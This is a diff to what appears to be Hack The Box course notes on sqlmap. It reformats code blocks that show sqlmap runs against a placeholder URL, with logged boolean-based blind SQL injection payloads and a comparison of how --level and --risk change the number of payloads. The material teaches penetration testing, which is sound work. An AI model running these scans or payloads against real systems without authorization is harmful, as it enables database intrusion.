@@ -1015,16 +1015,19 @@ adampueman@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5
 
 On the other hand, payloads used with the default `--level` value have a considerably smaller set of boundaries:
 
-        shellsession
+```shell
 `adampueman@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 ...SNIP... [14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause' [14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836 [14:20:36] [PAYLOAD] 1 AND 7496=4313 [14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN [14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz [14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY [14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'`
+```
 
 As for vectors, we can compare used payloads as follows:
 
-        shellsession
+```shell
 `adampueman@htb[/htb]$ sqlmap -u www.example.com/?id=1 ...SNIP... [14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause' [14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause' [14:42:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' ...SNIP...`
+```
 
-        shellsession
+```shell
 `adampueman@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3 ...SNIP... [14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause' [14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause' [14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)' ...SNIP... [14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' [14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)' [14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' ...SNIP... [14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause' [14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' [14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)' ...SNIP... [14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries' [14:46:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' [14:46:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)' ...SNIP...`
+```
 
 As for the number of payloads, by default (i.e. `--level=1 --risk=1`), the number of payloads used for testing a single parameter goes up to 72, while in the most detailed case (`--level=5 --risk=3`) the number of payloads increases to 7,865.
 
